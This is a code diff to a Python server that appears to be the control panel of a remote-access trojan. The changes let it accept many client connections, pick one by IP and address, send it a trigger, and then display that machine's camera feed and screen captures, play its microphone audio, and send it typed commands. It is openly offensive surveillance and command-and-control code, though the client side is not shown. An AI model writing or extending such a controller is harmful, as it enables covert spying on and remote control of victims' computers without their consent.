@@ -8,6 +8,7 @@ import time
 import cv2
 
 from multiprocessing import Process
+from threading import Thread
 
 host = "0.0.0.0"
 port = 4000
@@ -16,7 +17,8 @@ functions_mode = ["Camera stream"]
 audio = pyaudio.PyAudio()
 stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, output=True, frames_per_buffer=1024)
 
-#cv2.namedWindow('Stream', cv2.WINDOW_NORMAL)
+Users = {}
+IPs = []
 
 class commandCMD():
     def __init__(self, conn):
@@ -24,65 +26,67 @@ class commandCMD():
         self.commands()
 
     def commands(self):
+        msg = True
         command = input("CMD:")
-        self.conn.sendall(command.encode())
+        if msg:
+            self.conn.sendall(command.encode())
+            msg = False
         return None
 
 class server():
     def __init__(self):
         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.server.bind((host, port))
+        self.server.listen(10)
+
         self.frame = None
         self.modeState = 0
+        self.addr = None
+        self.ip = None
+        self.count = 0
         self.scrollUp = False
         self.scrollDown = True
         self.play_mic = True
         self.stop_loop = False
         self.data = b""
         self.payload_size = struct.calcsize("Q")
+        
+        connection = Thread(target=self.connectionStart, args=())
+        connection.start()
 
-        self.server.bind((host, port))
-        self.server.listen(10)
-        conn, addr = self.server.accept()
-        self.conn = conn
+        self.start()
 
-        print(f"Select mode: {functions_mode[self.modeState]}")
+        proc = Process(target=self.processData, args=())
+        proc.daemon = True
+        proc.start()
+        self.showCam()
+
+    def connectionStart(self):
+        while True:
+            conn, addr = self.server.accept()
+
+            ddr = addr[0]+":"+str(addr[1])
+            print(ddr)
+
+            Users[ddr] = conn
+            IPs.append(ddr)
+            print("Connection recv", ddr)
 
     def start(self):
         while True:
-            if keyboard.is_pressed("up")and self.scrollUp:
-                self.modeState -= 1
-                print(f"Select mode: {functions_mode[self.modeState]}")
-                time.sleep(0.5)
-            elif keyboard.is_pressed("down") and self.scrollDown:
-                self.modeState += 1
-                print(f"Select mode: {functions_mode[self.modeState]}")
-                time.sleep(0.5)
+            print("IP list: ", IPs)
 
-            elif keyboard.is_pressed("enter"):
-                print(f"{functions_mode[self.modeState]} activated.")
-                self.conn.sendall(functions_mode[self.modeState].encode())
+            self.outp = input("Select: ")
+            
+            try:
+                print(f"{Users[self.outp]} activated.")
+                
+                self.conn = Users[self.outp]
+                self.conn.sendall(b"cam_packet")
                 break
-
-            if self.modeState < 1:
-                self.scrollUp = False
-            else:
-                self.scrollUp = True
-            
-            if self.modeState > 2:
-                self.scrollDown = False
-            else:
-                self.scrollDown = True
-
-            time.sleep(0.2)
-
-        if functions_mode[self.modeState] == "Camera stream":
-            print("Camera initiation")
-            proc = Process(target=self.processData, args=(self.conn,))
-            proc.daemon = True
-            proc.start()
-            
-            self.conn.sendall(b"start_cam_stream")
-            self.showCam()
+            except Exception as err:
+                print(err)
+                continue
 
     
     def playMic(self, data):
@@ -123,8 +127,10 @@ class server():
             self.play_mic = False
             return None
 
-    def processData(self, conn):
+    def processData(self):
         while True:
+            conn = self.conn
+
             if self.stop_loop:
                 continue
             try:
@@ -135,7 +141,6 @@ class server():
             if action == 0x01 or action == 0x03:
                 frame_pack_len = conn.recv(1)[0]
                 cameraPacket = conn.recv(frame_pack_len)
-
                 if not cameraPacket:
                     continue
 
@@ -149,12 +154,11 @@ class server():
                     if action == 0x01:
                         cv2.imshow("Stream", frame)
                         cv2.waitKey(1)
-                    
-                    if action == 0x03:
+                    elif action == 0x03:
                         image_opencv = cv2.imdecode(frame, cv2.IMREAD_COLOR)
 
                         cv2.namedWindow("Screen", cv2.WINDOW_NORMAL) 
-                        cv2.resizeWindow("Screen", 1920, 720) 
+                        cv2.resizeWindow("Screen", 1920, 1080) 
 
                         cv2.imshow("Screen", image_opencv)
                         cv2.waitKey(1)
@@ -162,7 +166,6 @@ class server():
             elif action == 0x02:
                 mic_packet = conn.recv(2048)
                 self.playMic(mic_packet)
-            
             elif action == 0x04:
                 msg_len = conn.recv(3)
                 msg_len = (msg_len[0] << 16) + (msg_len[1] << 8) + msg_len[2]
@@ -179,5 +182,4 @@ class server():
                 self.stop_loop = False
 
 if __name__ == "__main__":
-    s = server()
-    s.start()
+    server()
